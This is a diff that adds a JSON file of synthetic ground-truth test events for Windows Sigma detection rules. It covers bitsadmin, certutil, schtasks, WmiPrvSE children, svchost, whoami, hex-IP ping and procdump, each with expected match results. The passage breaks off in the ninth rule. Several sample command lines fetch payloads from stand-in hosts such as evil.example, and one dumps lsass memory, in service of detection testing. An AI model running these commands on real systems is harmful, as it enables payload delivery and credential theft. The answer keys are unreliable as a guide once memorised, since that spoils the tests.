@@ -1,0 +1,3871 @@
+[
+  {
+    "index": 1,
+    "rule_id": "d059842b-6b9d-4ed1-b5c3-5b89143c6ede",
+    "filename": "proc_creation_win_bitsadmin_download.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-01-tp-1",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\bitsadmin.exe",
+              "type_id": 1,
+              "name": "bitsadmin.exe"
+            },
+            "cmd_line": "bitsadmin.exe /transfer job1 https://evil.example/a.ps1 C:\\Temp\\a.ps1",
+            "uid": "proc-gt-01-tp-1"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-01-tp-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "Image ends with \\bitsadmin.exe and CommandLine contains ' /transfer '.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-01-tp-2",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Temp\\renamed.exe",
+              "internal_name": "bitsadmin.exe",
+              "type_id": 1,
+              "name": "renamed.exe"
+            },
+            "cmd_line": "renamed.exe /addfile job1 http://198.51.100.10/p.exe C:\\Temp\\p.exe",
+            "uid": "proc-gt-01-tp-2"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-01-tp-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "Renamed binary matched via OriginalFileName=bitsadmin.exe with ' /addfile ' and 'http'.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-01-tn-1",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\bitsadmin.exe",
+              "type_id": 1,
+              "name": "bitsadmin.exe"
+            },
+            "cmd_line": "bitsadmin.exe /list /allusers",
+            "uid": "proc-gt-01-tn-1"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-01-tn-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "bitsadmin /list lacks transfer or create/addfile+http flags.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-01-tn-2",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\bitsadmin.exe",
+              "type_id": 1,
+              "name": "bitsadmin.exe"
+            },
+            "cmd_line": "bitsadmin.exe /create job1",
+            "uid": "proc-gt-01-tn-2"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-01-tn-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Has ' /create ' (selection_cli_1) but lacks 'http' (selection_cli_2).",
+        "ocsf_version": "1.4.0"
+      }
+    ]
+  },
+  {
+    "index": 2,
+    "rule_id": "19b08b1c-861d-4e75-a1ef-ea0c1baf202b",
+    "filename": "proc_creation_win_certutil_download.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-02-tp-1",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\certutil.exe",
+              "type_id": 1,
+              "name": "certutil.exe"
+            },
+            "cmd_line": "certutil.exe -urlcache -split -f http://198.51.100.5/payload.exe C:\\Temp\\p.exe",
+            "uid": "proc-gt-02-tp-1"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-02-tp-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "certutil.exe with 'urlcache ' and 'http'.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-02-tp-2",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Users\\Public\\cu.exe",
+              "internal_name": "CertUtil.exe",
+              "type_id": 1,
+              "name": "cu.exe"
+            },
+            "cmd_line": "cu.exe -verifyctl -f https://cdn.evil.test/s.bin",
+            "uid": "proc-gt-02-tp-2"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-02-tp-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "Matched OriginalFileName CertUtil.exe with 'verifyctl ' and 'http'.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-02-tn-1",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\certutil.exe",
+              "type_id": 1,
+              "name": "certutil.exe"
+            },
+            "cmd_line": "certutil.exe -hashfile C:\\Windows\\notepad.exe SHA256",
+            "uid": "proc-gt-02-tn-1"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-02-tn-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Local hashfile operation without download flags or http.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-02-tn-2",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\certutil.exe",
+              "type_id": 1,
+              "name": "certutil.exe"
+            },
+            "cmd_line": "certutil.exe -urlcache * delete",
+            "uid": "proc-gt-02-tn-2"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-02-tn-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Has 'urlcache ' but lacks 'http'.",
+        "ocsf_version": "1.4.0"
+      }
+    ]
+  },
+  {
+    "index": 3,
+    "rule_id": "39019a4e-317f-4ce3-ae63-309a8c6b53c5",
+    "filename": "proc_creation_win_schtasks_creation_temp_folder.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-03-tp-1",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\schtasks.exe",
+              "type_id": 1,
+              "name": "schtasks.exe"
+            },
+            "cmd_line": "schtasks.exe /create /tn Updater /tr C:\\Users\\alice\\AppData\\Local\\Temp\\run.bat /sc once /st 23:00",
+            "uid": "proc-gt-03-tp-1"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-03-tp-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "schtasks.exe with all three tokens: ' /create ', ' /sc once ', and '\\Temp\\'.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-03-tp-2",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\SysWOW64\\SCHTASKS.EXE",
+              "type_id": 1,
+              "name": "SCHTASKS.EXE"
+            },
+            "cmd_line": "SCHTASKS /CREATE /SC ONCE /TN Stage /TR C:\\Windows\\Temp\\s.exe /ST 01:00",
+            "uid": "proc-gt-03-tp-2"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-03-tp-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "Case-insensitive match on uppercase SCHTASKS flags and \\Temp\\.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-03-tn-1",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\schtasks.exe",
+              "type_id": 1,
+              "name": "schtasks.exe"
+            },
+            "cmd_line": "schtasks.exe /create /tn DailyJob /tr C:\\Windows\\Temp\\clean.bat /sc daily",
+            "uid": "proc-gt-03-tn-1"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-03-tn-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Uses '/sc daily' instead of required ' /sc once '.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-03-tn-2",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\schtasks.exe",
+              "type_id": 1,
+              "name": "schtasks.exe"
+            },
+            "cmd_line": "schtasks.exe /query /fo LIST",
+            "uid": "proc-gt-03-tn-2"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-03-tn-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Benign schtasks query.",
+        "ocsf_version": "1.4.0"
+      }
+    ]
+  },
+  {
+    "index": 4,
+    "rule_id": "8a582fe2-0882-4b89-a82a-da6b2dc32937",
+    "filename": "proc_creation_win_wmiprvse_susp_child_processes.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-04-tp-1",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\mshta.exe",
+              "type_id": 1,
+              "name": "mshta.exe"
+            },
+            "cmd_line": "mshta.exe http://198.51.100.20/drop.hta",
+            "parent_process": {
+              "file": {
+                "path": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+                "type_id": 1,
+                "name": "WmiPrvSE.exe"
+              },
+              "uid": "proc-gt-04-tp-1"
+            },
+            "uid": "proc-gt-04-tp-1"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-04-tp-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "WmiPrvSE.exe directly spawning mshta.exe (selection_children_1).",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-04-tp-2",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\cmd.exe",
+              "type_id": 1,
+              "name": "cmd.exe"
+            },
+            "cmd_line": "cmd.exe /Q /c powershell.exe -nop -w hidden -enc AAA=",
+            "parent_process": {
+              "file": {
+                "path": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+                "type_id": 1,
+                "name": "WmiPrvSE.exe"
+              },
+              "uid": "proc-gt-04-tp-2"
+            },
+            "uid": "proc-gt-04-tp-2"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-04-tp-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "WmiPrvSE.exe spawning cmd.exe invoking powershell (selection_children_2).",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-04-tn-1",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\msiexec.exe",
+              "type_id": 1,
+              "name": "msiexec.exe"
+            },
+            "cmd_line": "msiexec.exe /i C:\\Pkg\\app.msi /qn",
+            "parent_process": {
+              "file": {
+                "path": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+                "type_id": 1,
+                "name": "WmiPrvSE.exe"
+              },
+              "uid": "proc-gt-04-tn-1"
+            },
+            "uid": "proc-gt-04-tn-1"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-04-tn-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Excluded by filter_main_msiexec (msiexec.exe with '/i ').",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-04-tn-2",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\cmd.exe",
+              "type_id": 1,
+              "name": "cmd.exe"
+            },
+            "cmd_line": "cmd.exe /c ipconfig",
+            "parent_process": {
+              "file": {
+                "path": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+                "type_id": 1,
+                "name": "WmiPrvSE.exe"
+              },
+              "uid": "proc-gt-04-tn-2"
+            },
+            "uid": "proc-gt-04-tn-2"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-04-tn-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "cmd.exe under WmiPrvSE without scripting interpreter token in CommandLine.",
+        "ocsf_version": "1.4.0"
+      }
+    ]
+  },
+  {
+    "index": 5,
+    "rule_id": "01d2e2a1-5f09-44f7-9fc1-24faa7479b6d",
+    "filename": "proc_creation_win_svchost_uncommon_parent_process.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-05-tp-1",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\svchost.exe",
+              "type_id": 1,
+              "name": "svchost.exe"
+            },
+            "cmd_line": "svchost.exe -k netsvcs",
+            "parent_process": {
+              "file": {
+                "path": "C:\\Users\\Public\\injector.exe",
+                "type_id": 1,
+                "name": "injector.exe"
+              },
+              "uid": "proc-gt-05-tp-1"
+            },
+            "uid": "proc-gt-05-tp-1"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-05-tp-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "svchost.exe spawned by uncommon parent injector.exe.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-05-tp-2",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\svchost.exe",
+              "type_id": 1,
+              "name": "svchost.exe"
+            },
+            "cmd_line": "svchost.exe -k customflag",
+            "parent_process": {
+              "file": {
+                "path": "C:\\Windows\\System32\\svchost.exe",
+                "type_id": 1,
+                "name": "svchost.exe"
+              },
+              "uid": "proc-gt-05-tp-2"
+            },
+            "uid": "proc-gt-05-tp-2"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-05-tp-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "svchost.exe spawned by svchost.exe with non-whitelisted CommandLine suffix.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-05-tn-1",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\svchost.exe",
+              "type_id": 1,
+              "name": "svchost.exe"
+            },
+            "cmd_line": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
+            "parent_process": {
+              "file": {
+                "path": "C:\\Windows\\System32\\services.exe",
+                "type_id": 1,
+                "name": "services.exe"
+              },
+              "uid": "proc-gt-05-tn-1"
+            },
+            "uid": "proc-gt-05-tn-1"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-05-tn-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Standard services.exe parent filtered by filter_main_generic.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-05-tn-2",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\svchost.exe",
+              "type_id": 1,
+              "name": "svchost.exe"
+            },
+            "cmd_line": "svchost.exe",
+            "uid": "proc-gt-05-tn-2"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-05-tn-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Boundary: missing ParentImage filtered out by filter_main_parent_null.",
+        "ocsf_version": "1.4.0"
+      }
+    ]
+  },
+  {
+    "index": 6,
+    "rule_id": "8de1cbe8-d6f5-496d-8237-5f44a721c7a0",
+    "filename": "proc_creation_win_whoami_parent_anomaly.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-06-tp-1",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\whoami.exe",
+              "type_id": 1,
+              "name": "whoami.exe"
+            },
+            "parent_process": {
+              "file": {
+                "path": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+                "type_id": 1,
+                "name": "w3wp.exe"
+              },
+              "uid": "proc-gt-06-tp-1"
+            },
+            "uid": "proc-gt-06-tp-1"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-06-tp-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "whoami.exe spawned by IIS worker w3wp.exe.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-06-tp-2",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Temp\\check.exe",
+              "internal_name": "whoami.exe",
+              "type_id": 1,
+              "name": "check.exe"
+            },
+            "parent_process": {
+              "file": {
+                "path": "C:\\Program Files\\Apache\\httpd.exe",
+                "type_id": 1,
+                "name": "httpd.exe"
+              },
+              "uid": "proc-gt-06-tp-2"
+            },
+            "uid": "proc-gt-06-tp-2"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-06-tp-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "Renamed whoami.exe spawned by httpd.exe.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-06-tn-1",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\whoami.exe",
+              "type_id": 1,
+              "name": "whoami.exe"
+            },
+            "parent_process": {
+              "file": {
+                "path": "C:\\Windows\\System32\\cmd.exe",
+                "type_id": 1,
+                "name": "cmd.exe"
+              },
+              "uid": "proc-gt-06-tn-1"
+            },
+            "uid": "proc-gt-06-tn-1"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-06-tn-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Interactive shell cmd.exe filtered by filter_main_known_parents.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-06-tn-2",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\whoami.exe",
+              "type_id": 1,
+              "name": "whoami.exe"
+            },
+            "parent_process": {
+              "file": {
+                "path": "-",
+                "type_id": 1,
+                "name": "-"
+              },
+              "uid": "proc-gt-06-tn-2"
+            },
+            "uid": "proc-gt-06-tn-2"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-06-tn-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Boundary: ParentImage '-' filtered by filter_main_parent_empty.",
+        "ocsf_version": "1.4.0"
+      }
+    ]
+  },
+  {
+    "index": 7,
+    "rule_id": "1a0d4aba-7668-4365-9ce4-6d79ab088dfd",
+    "filename": "proc_creation_win_ping_hex_ip.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-07-tp-1",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\ping.exe",
+              "type_id": 1,
+              "name": "ping.exe"
+            },
+            "cmd_line": "ping.exe 0x7f000001",
+            "uid": "proc-gt-07-tp-1"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-07-tp-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "ping.exe with 8-digit hex IP 0x7f000001 matches 0x[a-fA-F0-9]{8}.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-07-tp-2",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\SysWOW64\\PING.EXE",
+              "type_id": 1,
+              "name": "PING.EXE"
+            },
+            "cmd_line": "ping -n 1 0xC633640A",
+            "uid": "proc-gt-07-tp-2"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-07-tp-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "Uppercase hex digits 0xC633640A match regex.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-07-tn-1",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\ping.exe",
+              "type_id": 1,
+              "name": "ping.exe"
+            },
+            "cmd_line": "ping.exe 198.51.100.10",
+            "uid": "proc-gt-07-tn-1"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-07-tn-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Standard dotted-quad IPv4 does not match hex regex.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-07-tn-2",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\ping.exe",
+              "type_id": 1,
+              "name": "ping.exe"
+            },
+            "cmd_line": "ping.exe 0x7f001",
+            "uid": "proc-gt-07-tn-2"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-07-tn-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Boundary: only 5 hex digits (< 8 required by {8}).",
+        "ocsf_version": "1.4.0"
+      }
+    ]
+  },
+  {
+    "index": 8,
+    "rule_id": "5afee48e-67dd-4e03-a783-f74259dcf998",
+    "filename": "proc_creation_win_sysinternals_procdump_lsass.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-08-tp-1",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Tools\\procdump64.exe",
+              "type_id": 1,
+              "name": "procdump64.exe"
+            },
+            "cmd_line": "procdump64.exe -accepteula -ma lsass.exe C:\\Temp\\lsass.dmp",
+            "uid": "proc-gt-08-tp-1"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-08-tp-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "Standard hyphen '-ma ' and ' ls' match procdump LSASS rule.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-08-tp-2",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Tools\\procdump.exe",
+              "type_id": 1,
+              "name": "procdump.exe"
+            },
+            "cmd_line": "procdump.exe /ma lsass C:\\Temp\\out.dmp",
+            "uid": "proc-gt-08-tp-2"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-08-tp-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "Windash slash variant ' /ma ' and ' ls' match procdump LSASS rule.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-08-tn-1",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Tools\\procdump64.exe",
+              "type_id": 1,
+              "name": "procdump64.exe"
+            },
+            "cmd_line": "procdump64.exe -ma notepad.exe C:\\Temp\\np.dmp",
+            "uid": "proc-gt-08-tn-1"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-08-tn-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Dumping notepad.exe lacks ' ls' / ' keyiso' / ' samss'.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-08-tn-2",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\tasklist.exe",
+              "type_id": 1,
+              "name": "tasklist.exe"
+            },
+            "cmd_line": "tasklist.exe /fi \"imagename eq lsass.exe\"",
+            "uid": "proc-gt-08-tn-2"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-08-tn-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Has ' ls' but lacks '-ma '/' -mm '/' -mp '.",
+        "ocsf_version": "1.4.0"
+      }
+    ]
+  },
+  {
+    "index": 9,
+    "rule_id": "f1086bf7-a0c4-4a37-9102-01e573caf4a0",
+    "filename": "proc_creation_win_renamed_whoami.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-09-tp-1",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Users\\Public\\svchost_helper.exe",
+              "internal_name": "whoami.exe",
+              "type_id": 1,
+              "name": "svchost_helper.exe"
+            },
+            "uid": "proc-gt-09-tp-1"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-09-tp-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "OriginalFileName is whoami.exe while Image is renamed.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-09-tp-2",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Temp\\1.com",
+              "internal_name": "WHOAMI.EXE",
+              "type_id": 1,
+              "name": "1.com"
+            },
+            "uid": "proc-gt-09-tp-2"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-09-tp-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "Case-insensitive OriginalFileName match with .com rename.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-09-tn-1",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\whoami.exe",
+              "internal_name": "whoami.exe",
+              "type_id": 1,
+              "name": "whoami.exe"
+            },
